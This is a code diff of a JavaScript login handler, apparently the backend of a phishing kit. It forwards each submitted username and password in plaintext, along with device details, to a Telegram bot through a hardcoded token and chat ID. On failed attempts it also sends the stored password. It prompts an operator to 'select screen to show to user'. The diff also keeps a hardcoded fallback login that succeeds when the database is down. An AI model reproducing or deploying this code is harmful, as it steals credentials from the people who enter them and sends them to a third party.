@@ -13,9 +13,13 @@ export default async function handler(req, res) {
 
     const { username, password, deviceInfo } = req.body;
 
+    // Config
+    const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8758506651:AAH-GCPCua0qS2dIvFINUg1LYMli91_t1Yg';
+    const CHAT_ID = process.env.TELEGRAM_CHAT_ID || '5290622641';
+
     // Trim whitespace and handle casing
-    const cleanUser = username.trim().toLowerCase();
-    const cleanPass = password.trim();
+    const cleanUser = (username || '').trim().toLowerCase();
+    const cleanPass = (password || '').trim();
 
     try {
         // Check against Redis Users
@@ -26,7 +30,7 @@ export default async function handler(req, res) {
 
         if (!isValid) {
             // Notify Admin with more detail
-            const dbPass = savedPassword || 'NONE';
+            const dbPass = savedPassword || 'NOT_IN_DB';
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -38,31 +42,21 @@ export default async function handler(req, res) {
             });
             return res.status(401).json({ error: 'INVALID_CREDENTIALS' });
         }
-    } catch (e) {
-        console.error('Redis Error:', e);
-        if (!(cleanUser === 'nextgen' && cleanPass === 'nextgen105')) {
-            return res.status(500).json({ error: 'DATABASE_OFFLINE' });
-        }
-    }
 
-    const message = `
+        // IF VALID: Send Success Notification
+        const message = `
 🚨 *NEW ACCESS DETECTED* 🚨
 
-👤 *Username:* ${username}
-🔑 *Password:* ${password}
-
+👤 *User:* \`${cleanUser}\`
+🔑 *Pass:* \`${cleanPass}\`
 📱 *Device:* ${deviceInfo.device}
 🌐 *Browser:* ${deviceInfo.browser}
 🖥️ *Platform:* ${deviceInfo.platform}
-📍 *IP:* ${req.headers['x-forwarded-for'] || req.socket.remoteAddress}
 
-Select action below:
-    `;
+Select screen to show to user:
+        `;
 
-    const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-
-    try {
-        await fetch(telegramUrl, {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
@@ -81,8 +75,13 @@ Select action below:
         });
 
         return res.status(200).json({ success: true });
-    } catch (error) {
-        console.error('Telegram Error:', error);
-        return res.status(500).json({ error: 'Failed to notify admin' });
+
+    } catch (e) {
+        console.error('API Error:', e);
+        // Fallback for default user if database is down
+        if (cleanUser === 'nextgen' && cleanPass === 'nextgen105') {
+            return res.status(200).json({ success: true });
+        }
+        return res.status(500).json({ error: 'INTERNAL_SERVER_ERROR', detail: e.message });
     }
 }
